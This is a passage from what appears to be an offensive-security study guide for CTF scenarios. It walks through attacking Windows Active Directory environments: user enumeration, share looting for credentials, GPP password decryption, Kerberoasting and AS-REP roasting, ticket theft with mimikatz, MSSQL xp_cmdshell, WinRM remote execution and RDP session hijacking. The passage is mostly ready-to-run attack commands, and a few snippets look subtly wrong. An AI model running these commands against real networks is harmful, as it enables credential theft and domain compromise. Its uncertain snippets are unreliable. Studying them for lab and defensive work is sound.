enum4linux -r -u "username" -p "password" <target>
```

**Impacket lookupsid.py**

```bash
# Enumerate users via RID cycling
lookupsid.py domain.local/username:password@<target>

# Specify RID range
lookupsid.py domain.local/username:password@<target> 500-2000
```

**CrackMapExec RID Cycling**

```bash
crackmapexec smb <target> -u username -p password --rid-brute
```

### LDAP User Enumeration

```bash
# All user accounts
ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName userPrincipalName

# Active accounts only
ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" sAMAccountName

# Service accounts (SPNs)
ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Admin accounts
ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(adminCount=1)" sAMAccountName
```

### Kerberos-Based User Enumeration

**kerbrute**

```bash
# User enumeration (no credentials required)
kerbrute userenum -d domain.local --dc <DC-IP> userlist.txt

# Output valid users
kerbrute userenum -d domain.local --dc <DC-IP> userlist.txt -o valid-users.txt
```

**Nmap Kerberos Enumeration**

```bash
nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=users.txt <DC-IP>
```

### SMB User Enumeration

**CrackMapExec User Enumeration**

```bash
# List domain users
crackmapexec smb <DC-IP> -u username -p password --users

# Export to file
crackmapexec smb <DC-IP> -u username -p password --users | grep -oP 'domain.local\\\K\S+' > users.txt
```

**rpcclient User Enumeration**

```bash
rpcclient -U username <DC-IP>
> enumdomusers
> queryuser <RID>
> querydispinfo
```

### Gathering User Attributes

**Important User Attributes via LDAP**

```bash
# User details including description (often contains passwords)
ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName description info

# Password policy attributes
ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=user)" pwdLastSet badPwdCount

# Users with no password expiration
ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=65536)" sAMAccountName
```

### Group Membership Enumeration

```bash
# Enumerate all groups
ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=group)" cn member

# Domain Admins specifically
ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(cn=Domain Admins)" member

# Nested group membership
net rpc group members "Domain Admins" -U domain.local/username%password -S <DC-IP>
```

**CrackMapExec Group Enumeration**

```bash
crackmapexec smb <DC-IP> -u username -p password --groups
crackmapexec ldap <DC-IP> -u username -p password --groups
```

### Privileged User Discovery

**Accounts with adminCount=1**

```bash
ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(adminCount=1)" sAMAccountName memberOf
```

**Users with SPN (Kerberoastable)**

```bash
GetUserSPNs.py domain.local/username:password -dc-ip <DC-IP>
```

**Users without Kerberos Pre-Auth (AS-REP Roastable)**

```bash
GetNPUsers.py domain.local/username:password -dc-ip <DC-IP>
```

---

**Key Enumeration Considerations**

**[Inference]** During CTF scenarios, the following enumeration priorities typically yield results:

1. Null session and guest access attempts first (low-hanging fruit)
2. RID cycling for user discovery when credentials are unavailable
3. LDAP queries for comprehensive AD enumeration when credentials exist
4. Kerberos-based techniques for stealthy enumeration without SMB logging

**Important Subtopics for Further Study:**

- **Pass-the-Hash and Pass-the-Ticket techniques** for lateral movement after enumeration
- **GPO Enumeration** for privilege escalation vectors
- **Trust Relationship Enumeration** for cross-domain attacks
- **SYSVOL and NETLOGON share analysis** for credential harvesting

---

## Share Enumeration

Windows share enumeration identifies network-accessible resources, maps permissions, discovers hidden shares, and locates credential artifacts for lateral movement and privilege escalation.

**Network Share Discovery**

Identify shared resources on target systems from remote reconnaissance:

```bash
nmap -sV --script smb-enum-shares <target>
nmap -sV --script smb-enum-shares,smb-os-discovery <target>
```

The `smb-enum-shares` Nmap script connects to SMB services (typically port 445 or 139) and enumerates available shares without authentication when null sessions are enabled [Inference] though actual share visibility depends on server configuration and null session restrictions.

Use `smbclient` for direct enumeration:

```bash
smbclient -L //<target> -N
smbclient -L //<target> -U ""
smbclient -L //<target> -U "domain/user%password"
```

The `-L` flag lists shares; `-N` suppresses password prompt for null session attempts; `-U` specifies credentials. Output displays sharenames, types (SMBSERVER, PRINTER, IPC$, TEMPORARY), and comments.

**Null Session and Guest Access Testing**

Attempt to connect without credentials:

```bash
smbclient //<target>/sharename -N
smbclient //<target>/IPC$ -N
rpcclient -U "" <target> -N
net use \\<target>\share
```

The `IPC$` share provides inter-process communication access [Unverified] enabling RPC-based enumeration without file system access on systems where IPC$ is accessible to null sessions, though modern Windows defaults restrict this.

Interactive null session shell:

```bash
smbclient -L //<target> -N
# Once connected
ls
cd directory
get filename
put localfile remotename
```

**Hidden Share Discovery**

Enumerate hidden shares (suffixed with $) accessible through specific enumeration methods:

```bash
nmap --script smb-enum-shares <target>
enum4linux -S <target>
enum4linux -S -u "" -p "" <target>
```

Hidden shares (C$, D$, IPC$, ADMIN$) provide [Inference] administrative access when null sessions are enabled, though administrative shares typically require elevated privileges for connection regardless of null session configuration.

Automated enumeration via `crackmapexec`:

```bash
crackmapexec smb <target> --shares
crackmapexec smb <target> -u "" -p "" --shares
crackmapexec smb <target> -u "user" -p "password" --shares
```

**Share Permission Analysis**

Examine access permissions on discovered shares:

```bash
smbcacls //<target>/sharename /path/to/file -U "user%password"
```

Test write permissions by attempting file operations:

```bash
smbclient //<target>/sharename -U "user%password"
# Within smbclient
put testfile.txt
del testfile.txt
```

World-writable shares (readable and writable by any authenticated user) enable [Inference] arbitrary file placement, configuration modification, or credential harvesting depending on share contents and accessibility, though actual exploitation depends on file types and applications consuming those files.

**Special Share Identification**

Administrative shares reveal [Inference] system information and enable privileged operations:

- **C$, D$, etc.** â€” Drive root directories, accessible to administrators
- **IPC$** â€” Pipe share for inter-process communication and RPC operations
- **ADMIN$** â€” Remote administration share pointing to `%windir%`
- **SYSVOL** â€” Group Policy distribution on domain controllers
- **NETLOGON** â€” Domain logon scripts and user profiles

Access to SYSVOL or NETLOGON shares enables [Inference] Group Policy object analysis and potential credential extraction through domain scripts, though specific exploitation depends on policy content and script content.

**Credential Artifact Discovery**

Search mounted shares for sensitive files:

```bash
smbclient //<target>/sharename -U "user%password"
# Within smbclient
search *.txt
search *password*
search *config*
recurse on
ls -R
```

Look for configuration files (web.config, app.config), batch scripts, PowerShell scripts containing credentials, or backup files containing sensitive data. [Unverified] The prevalence of hardcoded credentials in configuration files varies by organization and application, though configuration discovery remains a standard enumeration practice.

**Recursive Share Enumeration and Mapping**

Map entire directory structures:

```bash
smbmap -H <target> -u "" -p ""
smbmap -H <target> -u "user" -p "password"
smbmap -H <target> -u "user" -p "password" -R sharename
```

The `smbmap` tool recursively explores shares, displays file listings with permissions, and identifies writable directories. Output format shows share paths, permissions, and file types.

**Share Credential Harvesting**

Extract credentials from accessible share resources:

```bash
find /mnt/smb_mount -name "*password*" -o -name "*.conf" -o -name "*.config"
grep -r "password\|credential\|username" /mnt/smb_mount --include="*.txt" --include="*.conf" --include="*.xml"
```

Mounted shares expose application configurations, deployment scripts, and backup files potentially containing embedded credentials [Inference] though credential formats and extraction feasibility depend on file types and encryption status.

---

## Group Policy Enumeration

Group Policy enumeration identifies domain policies, extracts policy settings, discovers policy-based credentials, and maps policy application to systems for privilege escalation and lateral movement.

**Domain Group Policy Discovery**

Enumerate Group Policy Objects on domain controllers:

```bash
nmap -sV --script smb-enum-domains <target-dc>
enum4linux -G <target-dc>
rpcclient -U "domain/user%password" <target-dc> -c "enumdomgroups"
```

Connect to domain controller SMB services and query RPC endpoints for policy information.

**SYSVOL and NETLOGON Access**

Access domain policy distribution points:

```bash
smbclient //<target-dc>/SYSVOL -U "domain/user%password"
smbclient //<target-dc>/NETLOGON -U "domain/user%password"
mount -t cifs //<target-dc>/SYSVOL /mnt/sysvol -o username=user,password=password,domain=domain
```

The SYSVOL share contains Group Policy Objects (GPOs) in XML format, user scripts, and logon scripts. Policy structure:

```
\\<domain>\sysvol\<domain>\Policies\{<GUID>}\
```

Each GUID represents a distinct policy object. Subdirectories include:

- `Machine/` â€” Computer configuration policies
- `User/` â€” User configuration policies
- `Scripts/` â€” Logon/logoff scripts and administrative scripts

**GPO Credential Extraction**

Search policy files for embedded credentials:

```bash
grep -r "password\|cpassword\|username" /mnt/sysvol --include="*.xml"
find /mnt/sysvol -name "*.xml" -exec grep -l "cpassword" {} \;
```

Group Policy Preferences (GPP) stored credentials in `Groups.xml` files using reversible encryption [Unverified] though Microsoft deprecated this functionality in newer Windows versions due to security concerns. The `cpassword` field contains AES-encrypted credentials.

Extract GPP passwords using specialized tools:

```bash
gpp-decrypt "cpassword_value"
```

The GPP encryption uses a known static key [Inference] enabling straightforward decryption of extracted credentials, though this vector is patched in modern Windows environments with GPP encryption disabled by default.

**Policy Script Analysis**

Examine scripts referenced in policies:

```bash
cat /mnt/sysvol/<domain>/Policies/{<GUID>}/Machine/Scripts/scripts.ini
cat /mnt/sysvol/<domain>/Policies/{<GUID>}/User/Scripts/scripts.ini
```

Scripts may contain hardcoded credentials, service account credentials, or commands executed during logon/logoff [Inference] providing execution context with system or domain privileges depending on script type and execution context configuration.

**Registry-Based Policy Enumeration (Local)**

From compromised systems, examine applied policies:

```powershell
Get-GPO -All
Get-GPOReport -All -ReportType Xml
gpresult /h report.html
gpresult /scope:computer /h computer-policy.html
gpresult /scope:user /h user-policy.html
```

The `gpresult` command displays Group Policy application results. Analyze output to identify policies applicable to the current user/computer context.

**Policy Permissions and Application**

Identify policy scope and application:

```bash
smbcacls //<target-dc>/SYSVOL "/Policies/{<GUID>}" -U "user%password"
```

Policies with write permissions allow [Inference] modification enabling privilege escalation through malicious policy application, though write permissions on policies typically require domain administrator privileges or specific delegated permissions.

**Domain Group Policy Preferences Analysis**

Discover policy-referenced resources:

```bash
find /mnt/sysvol -name "scheduledtasks.xml" -o -name "services.xml" -o -name "printers.xml"
cat /mnt/sysvol/<domain>/Policies/{<GUID>}/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml
```

Policy preferences define scheduled tasks, services, mapped drives, and other configurations. Scheduled tasks may reference executables with embedded credentials or execute commands with elevated privileges.

**Policy Application Timeline**

Determine policy age and modification status:

```bash
stat /mnt/sysvol/<domain>/Policies/{<GUID>}
```

Recently modified policies may indicate [Inference] active administration or response to security incidents, while older policies may contain deprecated configurations or legacy credentials.

**Kerberos Policy Enumeration**

Extract Kerberos-related policies:

```bash
grep -r "kerberos\|ticket\|krbtgt" /mnt/sysvol --include="*.xml" -i
```

Policies may specify Kerberos ticket lifetimes, encryption algorithms, or pre-authentication requirements affecting attack surface [Unverified] though specific policy impact on Kerberos behavior depends on Windows version and configuration.

---

## Kerberos Enumeration

Kerberos enumeration identifies domain users, discovers service accounts, maps service-to-account relationships, and enumerates ticket-granting ticket (TGT) information for credential theft and privilege escalation.

**Domain User Discovery via Kerberos**

Enumerate domain users through Kerberos name resolution:

```bash
kerbrute userenum --dc <target-dc> userlist.txt
kerbrute userenum --dc <target-dc> -d domain.local userlist.txt
```

The `kerbrute` tool queries the Kerberos authentication service with username attempts. Responses differ between valid and invalid usernames [Inference] enabling user enumeration against domain controllers even when null SMB sessions are disabled, though specific response parsing depends on Kerberos implementation details.

Alternative enumeration via LDAP (over Kerberos):

```bash
ldapsearch -H ldap://<target-dc> -x -s sub "(objectClass=user)" sAMAccountName
ldapsearch -H ldap://<target-dc> -x -s sub "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=512))" sAMAccountName
```

The `-x` flag disables SASL authentication; `-s sub` searches subtree. LDAP query filters identify user objects and account control flags.

**Service Principal Name (SPN) Enumeration**

Discover service accounts and their associated services:

```bash
setspn -L <domain-controller>
setspn -T <domain> -F -Q */*
```

Alternatively, using `GetUserSPNs.py` from Impacket:

```bash
GetUserSPNs.py domain.local/user:password
GetUserSPNs.py -dc-ip <target-dc> domain.local/user:password
```

SPN format: `service_class/hostname:port/service_name`. Output reveals [Inference] which services run under specific user accounts, enabling targeted Kerberoasting attacks against those service accounts, though actual exploitation requires valid domain credentials for TGT acquisition.

**Kerberos Pre-Authentication Analysis**

Identify accounts with pre-authentication disabled:

```bash
GetNPUsers.py domain.local/ -usersfile userlist.txt
GetNPUsers.py -dc-ip <target-dc> domain.local/user:password
```

Accounts with pre-authentication disabled (UserAccountControl flag 0x400000) allow [Inference] AS-REP Roasting attacks where attackers request authentication responses without providing credentials, enabling offline password cracking for affected accounts, though this configuration is uncommon in modern domains.

Alternatively, query via LDAP:

```bash
ldapsearch -H ldap://<target-dc> -x "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```

**TGT Acquisition and Inspection**

Request Kerberos TGTs using known credentials:

```bash
kinit user@DOMAIN.LOCAL
kinit -c /tmp/ccache_file user@DOMAIN.LOCAL
```

On Windows:

```powershell
$credential = New-Object System.Management.Automation.PSCredential("DOMAIN\user", (ConvertTo-SecureString "password" -AsPlainText -Force))
New-NetLogonUser -Credential $credential
```

List cached tickets:

```bash
klist
klist -c /tmp/ccache_file
```

**Kerberoasting**

Extract service ticket hashes for offline cracking:

```bash
GetUserSPNs.py -request domain.local/user:password
GetUserSPNs.py -dc-ip <target-dc> -request domain.local/user:password
```

Output displays extracted TGS (Ticket Granting Service) tickets in crackable format. Alternatively, from Windows:

```powershell
Add-Type -AssemblyName System.IdentityModel
$DCName = "<domain-controller>"
$Credential = New-Object System.Management.Automation.PSCredential("domain\user", (ConvertTo-SecureString "password" -AsPlainText -Force))
[System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::Bind($Credential)
klist
```

Export tickets for external processing with `mimikatz`:

```
kerberos::list /export
```

Kerberoasting attacks target service accounts running under non-machine accounts [Inference] where the service ticket encryption uses the service account password rather than machine account credentials, enabling offline brute-force against typically weaker service account passwords, though successful exploitation requires either existing domain credentials or pre-authentication bypasses.

**Delegation Analysis**

Identify Kerberos delegation configurations:

```bash
ldapsearch -H ldap://<target-dc> -x "(&(objectClass=user)(|(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=1048576))))" msDS-AllowedToDelegateTo sAMAccountName
```

Query delegation flags using LDAP:

```bash
enum4linux -U <target-dc>
```

Unconstrained delegation (UserAccountControl flag 0x80000) permits [Inference] use of TGTs for accessing any service as the delegated account, enabling privilege escalation through TGT theft and reuse, though specific exploitation depends on compromising systems with unconstrained delegation configured.

Constrained delegation (msDS-AllowedToDelegateTo) restricts delegation to specific services, reducing [Inference] but not eliminating exploitation surface through protocol transition attacks (S4U2Proxy), though actual attack feasibility depends on specific delegation configuration and Kerberos protocol version support.

**Ticket-Granting Ticket (TGT) Theft and Reuse**

Extract TGTs from compromised systems:

```bash
mimikatz # kerberos::list
mimikatz # kerberos::ptc <ticket_file>
```

Base64-encoded tickets extracted via `klist /export`:

```bash
echo "base64_ticket_data" | base64 -d > ticket.kirbi
```

Import tickets for use against domain resources:

```bash
kinit -c /tmp/ccache_file --keytab=ticket.ccache
export KRB5CCNAME=/tmp/ccache_file
```

TGT reuse enables [Inference] lateral movement and privilege escalation under the compromised user's identity, though TGT validity depends on ticket expiration (typically 10 hours) and server clock synchronization [Unverified] regarding specific Kerberos implementation tolerance for temporal deviations.

**Resource-Based Constrained Delegation (RBCD)**

Enumerate RBCD configurations:

```bash
ldapsearch -H ldap://<target-dc> -x "(&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" msDS-AllowedToActOnBehalfOfOtherIdentity sAMAccountName
```

RBCD allows [Inference] computers to act on behalf of other identities when performing S4U2Proxy delegation, enabling privilege escalation from any computer account (frequently compromised through machine compromise or Responder-based captures) to domain administrators or service accounts, though specific exploitation requires S4U2Proxy-capable Kerberos implementations.

**Kerberos Encryption Downgrade Analysis**

Identify weaker encryption algorithms in use:

```bash
grep -r "encryptionType\|krbtgt\|RC4" /mnt/sysvol --include="*.xml" -i
```

Systems supporting legacy encryption (DES, RC4) enable [Inference] reduced-complexity offline cracking of captured Kerberos tickets, though modern Windows defaults use AES-256-CTS-HMAC-SHA1-96 making legacy attacks increasingly uncommon on updated systems.

---

## MSSQL Enumeration

MSSQL enumeration identifies database instances, discovers databases and tables, extracts credentials from database objects, and maps database privileges for lateral movement and data exfiltration.

**MSSQL Service Discovery**

Identify SQL Server instances on the network:

```bash
nmap -sU -p 1434 <target>
nmap -sV -p 1433,1434,3306,5432 <target>
nmap -sV --script mssql-info <target>
nmap -sV --script mssql-enum-accounts <target>
```

SQL Server typically listens on TCP port 1433 (default named instance) and UDP port 1434 (SQL Server Browser). The `-sU` flag performs UDP scanning; UDP port 1434 responses reveal [Inference] instance names, versions, and clustering information when SQL Server Browser service is enabled, though this service is frequently disabled on hardened systems.

**SQL Server Authentication Testing**

Attempt connection with default and weak credentials:

```bash
sqsh -S <target> -U sa -P ""
sqsh -S <target> -U sa -P "password"
impacket-mssqlclient <target>/sa:password@<target>
impacket-mssqlclient -windows-auth <target>/domain\\user:password@<target>
```

The `sqsh` command-line client connects interactively; Impacket's `mssqlclient` provides [Inference] enhanced reconnaissance capabilities including database enumeration and extended stored procedure execution when authentication succeeds.

Connection string format:

```
host:port\InstanceName
```

Multiple instances on single servers use port ranges or named pipes for communication [Unverified] though most enumeration tools default to instance port 1433 and require explicit specification for non-default configurations.

**Database and Table Enumeration**

Query database structure after authentication:

```sql
SELECT name FROM sys.databases;
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA != 'dbo';
```

From command line:

```bash
impacket-mssqlclient -windows-auth domain\\user:password@<target> -query "SELECT name FROM sys.databases;"
```

Identify application-specific databases (non-system), custom tables, and potentially sensitive data storage [Inference] indicating high-value targets for credential or data extraction, though specific sensitivity depends on application purpose and data classification.

**Credential Harvesting from Database Objects**

Search for stored procedures, views, and triggers containing credentials:

```sql
SELECT ROUTINE_NAME, ROUTINE_DEFINITION FROM INFORMATION_SCHEMA.ROUTINES WHERE ROUTINE_DEFINITION LIKE '%password%';
SELECT OBJECT_NAME, DEFINITION FROM sys.sql_modules WHERE DEFINITION LIKE '%password%';
EXEC sp_helpdb;
```

Examine user tables for credential patterns:

```sql
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES 
WHERE TABLE_NAME LIKE '%user%' OR TABLE_NAME LIKE '%account%' OR TABLE_NAME LIKE '%credential%';
SELECT * FROM users;
SELECT * FROM credentials;
```

[Unverified] Database objects frequently contain application credentials, API keys, or service account passwords embedded in connection strings or stored procedures, though credential storage practices vary significantly by application design.

**Linked Server Enumeration**

Discover inter-database connections:

```sql
EXEC sp_linkedservers;
SELECT * FROM sys.servers;
EXEC sp_helpserver;
```

Linked servers enable [Inference] lateral movement to other database instances or systems when configured with stored credentials, allowing pivoting from compromised SQL Server instances to interconnected infrastructure, though actual exploitation depends on linked server authentication method and target system accessibility.

**SQL Server Agent Jobs Analysis**

Examine scheduled jobs for credential exposure:

```sql
USE msdb;
SELECT * FROM sysjobs;
SELECT * FROM sysjobsteps;
SELECT job_id, step_id, command FROM sysjobsteps WHERE command LIKE '%password%';
```

Job steps may contain [Inference] hardcoded credentials, service account credentials, or commands executing with elevated privileges (job owner privileges), though credential visibility depends on specific job implementation and permissions.

**Extended Stored Procedures and CLR Integration**

Identify dangerous extension capabilities:

```sql
SELECT * FROM sys.objects WHERE type = 'X';
SELECT name FROM sys.assemblies WHERE permission_set_id != 1;
SELECT * FROM sys.assembly_files;
```

Extended stored procedures (type 'X') enable [Inference] operating system command execution under SQL Server service account privileges when enabled, potentially allowing arbitrary code execution on the database server, though xp_cmdshell is disabled by default on modern installations due to security concerns.

Enable and use xp_cmdshell [Unverified] when configuration permits:

```sql
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'whoami';
```

[Inference] CLR assemblies compiled to intermediate language (IL) may execute arbitrary code when registered in SQL Server, though CLR integration requires explicit enablement and administrative privileges for assembly registration.

**SQL Server Service Account Identification**

Determine SQL Server execution context:

```sql
SELECT SUSER_NAME();
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER', 'ObjectName';
```

From command line using `impacket-mssqlclient`:

```bash
impacket-mssqlclient -windows-auth domain\\user:password@<target> -query "SELECT SUSER_NAME();"
```

Service account privileges determine [Inference] potential impact of SQL Server compromiseâ€”service accounts running as LocalSystem or domain administrators enable privileged operations across the network, while service accounts running as NETWORKSERVICE or local service accounts limit exploitability to the database server itself.

**SQL Server Port Scanning Optimization**

Comprehensive database server reconnaissance:

```bash
nmap -sV -p 1433,1434 --script mssql-* <target>
nmap -sV -p 1433 --script mssql-empty-password <target>
nmap -sV -p 1433 --script mssql-info,mssql-enum-accounts,mssql-query <target>
```

The `mssql-empty-password` script tests sa (system administrator) account with empty passwordâ€”a [Unverified] common misconfiguration on development/test instances though rarely present on production systems with proper hardening.

**Database Privilege Escalation**

Identify database roles and permissions:

```sql
SELECT * FROM sys.database_principals WHERE type = 'R';
EXEC sp_helprole;
SELECT name, sid FROM sys.database_principals WHERE type = 'R';
SELECT DB_NAME(database_id), * FROM sys.database_permissions;
```

Database roles with administrative privileges (db_owner, db_securityadmin) enable [Inference] credential modification, user creation, or privilege escalation within database scope, though domain-level privilege escalation requires additional exploitation vectors beyond database permissions.

---

## WinRM Enumeration

Windows Remote Management (WinRM) provides remote command execution capabilities and represents a significant attack surface when improperly configured or when default credentials persist.

**WinRM Service Status Detection**

Verify WinRM availability and listening status:

```powershell
Get-Service WinRM | Select-Object Status, StartType
Test-WSMan
Test-WSMan -ComputerName target_host
```

The `Test-WSMan` cmdlet validates HTTP/HTTPS connectivity to the WinRM service (default ports 5985 for HTTP, 5986 for HTTPS).

**Port and Listener Enumeration**

```powershell
Get-WSManInstance winrm/config/listener
Get-WSManInstance winrm/config/listener -SelectorSet @{Address="*";Transport="HTTP"}
Get-WSManInstance winrm/config/listener -SelectorSet @{Address="*";Transport="HTTPS"}
```

Examine listener bindings to identify accessible protocols and authentication methods:

```powershell
winrm enumerate winrm/config/listener
winrm get winrm/config
```

**Authentication Method Detection**

```powershell
Get-WSManInstance winrm/config | Select-Object -ExpandProperty auth
(Get-WSManInstance winrm/config).auth
```

Output displays enabled authentication mechanisms (Basic, Kerberos, Negotiate, Digest, CredSSP). Basic authentication over HTTP represents highest risk.

```powershell
# Detailed authentication configuration
winrm get winrm/config | findstr /I "auth"
```

**Credential Delegation Analysis**

CredSSP delegation enables credential passing to remote systems:

```powershell
Get-WSManInstance winrm/config/service | Select-Object -ExpandProperty auth
Get-Item -Path WSMan:\localhost\Service\Auth\CredSSP
```

If CredSSP is enabled without restrictions, credentials may be exposed through relay attacks or credential harvesting.

**AllowUnencrypted Traffic Detection**

```powershell
Get-Item -Path WSMan:\localhost\Service\AllowUnencrypted
Get-Item -Path WSMan:\localhost\Client\AllowUnencrypted
```

Value of `true` indicates unencrypted WinRM traffic, exposing credentials in transit.

**Remote Access Permissions**

Identify which users/groups possess WinRM execution rights:

```powershell
Get-PSSessionConfiguration
Get-PSSessionConfiguration | Select-Object Name, Permission
icacls "\\?\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN"
```

Examine session configuration descriptors for restricted access:

```powershell
Get-PSSessionConfiguration -Name Microsoft.PowerShell | Select-Object @{Name="RunAs";Expression={$_.RunAsUser}}
```

**WinRM Discovery via Network Enumeration**

From external position, enumerate WinRM availability:

```bash
# From Linux attacking Windows target
nmap -p 5985,5986 target_host
nmap -p 5985,5986 --script=winrm-identify target_host
curl -k https://target_host:5986/wsman
```

**WinRM Connection Exploitation**

Establish remote session when credentials are available:

```powershell
$credential = New-Object System.Management.Automation.PSCredential("domain\username", (ConvertTo-SecureString "password" -AsPlainText -Force))
$session = New-PSSession -ComputerName target_host -Credential $credential -Authentication Negotiate
Enter-PSSession $session
```

Execute commands without interactive session:

```powershell
Invoke-Command -ComputerName target_host -Credential $credential -ScriptBlock { whoami; Get-Content C:\flag.txt }
```

**WinRM over HTTPS with Self-Signed Certificates**

Bypass certificate validation when connecting to systems with self-signed certificates:

```powershell
$credential = New-Object System.Management.Automation.PSCredential("domain\username", (ConvertTo-SecureString "password" -AsPlainText -Force))
$sessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$session = New-PSSession -ComputerName target_host -Credential $credential -UseSSL -SessionOption $sessionOption
```

**Default WinRM Configuration Paths**

Configuration files for enumeration:

```powershell
Get-Content $env:windir\System32\wsman\config\winrm.config.d\*.xml
Get-Content $env:windir\System32\wsman\config\winrm.config
```

## RDP Enumeration

Remote Desktop Protocol (RDP) provides graphical remote access and frequently appears in CTF scenarios and post-exploitation workflows. Misconfigurations expose systems to credential stuffing, protocol exploitation, and session hijacking.

**RDP Service Status and Port Detection**

Verify RDP service availability:

```powershell
Get-Service TermService | Select-Object Status, StartType
netstat -ano | findstr :3389
Get-NetTCPConnection -LocalPort 3389
```

RDP defaults to TCP port 3389 but may be configured on alternative ports. Enumerate listening ports:

```powershell
Get-NetTCPConnection -State Listen | Where-Object {$_.LocalPort -gt 3000}
```

**RDP Configuration Analysis**

Access RDP settings via Group Policy and registry:

```powershell
gpresult /h report.html
# Then search for RDP-related policies within the generated report
```

Direct registry interrogation:

```powershell
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" | Select-Object fDenyTSConnections
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" | Select-Object SecurityLayer, MinEncryptionLevel
```

Key registry values:

- `fDenyTSConnections`: 0 = RDP enabled, 1 = RDP disabled
- `SecurityLayer`: 0 = RDP, 1 = Negotiate, 2 = SSL/TLS
- `MinEncryptionLevel`: 1 = Low, 2 = Client-Compatible, 3 = High, 4 = FIPS

**Authentication Requirement Detection**

```powershell
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" | Select-Object UserAuthentication
```

Value of 0 indicates NLA (Network Level Authentication) disabled, allowing connection attempts before credential submission.

**RDP Security Policy Enumeration**

```powershell
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\Terminal Services" | Select-Object *
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" | Select-Object SecurityLayer, MinEncryptionLevel, EncryptionLevel
```

**RDP Session Enumeration**

List active RDP sessions:

```powershell
query session
query user
quser
Get-NetTCPConnection -State Established -LocalPort 3389
```

Obtain detailed session information:

```powershell
Get-Process -IncludeUserName | Where-Object {$_.ProcessName -eq "svchost"} | Select-Object UserName
```

**RDP Certificate Detection**

RDP uses self-signed certificates by default. Export and analyze:

```powershell
# Enumerate RDP certificate thumbprint
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" | Select-Object SSLCertificateSHA1Hash

# Export certificate details
mmc.exe /snap:certlm.msc
# Navigate to: Personal > Certificates > RDP certificate
```

Certificate information can identify certificate validity, expiration, and potential spoofing attacks.

**Network-Based RDP Enumeration**

From external attack platform:

```bash
# Port scanning
nmap -p 3389 target_host
nmap -p 3389 --script rdp-enum-encryption target_host

# Banner grabbing
nmap -p 3389 --script rdp-ntlm-info target_host

# Using Metasploit
msfconsole
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS target_host
run
```

Gather RDP version and capabilities:

```bash
python3 rdpy-scanner.py target_host 3389
```

**RDP Credential Harvesting via Downgrade**

[Unverified] RDP supports multiple encryption levels. Systems configured for compatibility may accept downgraded connections. Test encryption negotiation:

```bash
# Using mstsc from Windows
mstsc /v:target_host /admin

# From Linux, using xfreerdp
xfreerdp /v:target_host /u:username /p:password +credentials-guard
```

**RDP Session Hijacking**

If local administrator access exists, assume RDP sessions of other users:

```powershell
query session
# Identify target session ID
tscon 1 /dest:console
# Or
mstsc.exe /v:target_host /admin
```

[Inference] Session hijacking requires local administrative privileges and depends on session state accessibility.

**RDP Gateway Enumeration**

Identify RDP Gateway servers enabling external access:

```powershell
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\Terminal Services\RPC" | Select-Object *
netsh advfirewall firewall show rule name="*RDP*"
```

Check for RDP Gateway configuration:

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved" | Select-Object "*RDP*"
```

## Windows Registry Analysis

The Windows Registry contains system configuration, user credentials, application settings, and historical activity data essential for privilege escalation and lateral movement.

**Registry Structure Overview**

Primary registry hives:

- `HKEY_LOCAL_MACHINE (HKLM)`: System-wide settings
- `HKEY_CURRENT_USER (HKCU)`: Active user settings
- `HKEY_USERS`: All user profiles
- `HKEY_CLASSES_ROOT`: File associations and COM classes
- `HKEY_CURRENT_CONFIG`: Hardware profile settings

**Registry Hive File Locations**

Physical hive files on disk:

```powershell
Get-Item -Path "C:\Windows\System32\config\*" | Select-Object Name, LastWriteTime
```

User-specific hives:

```powershell
Get-Item -Path "C:\Users\*\NTUSER.DAT" -Force | Select-Object FullName, LastWriteTime
```

**Credentials and Authentication Data**

Extract cached credentials:

```powershell
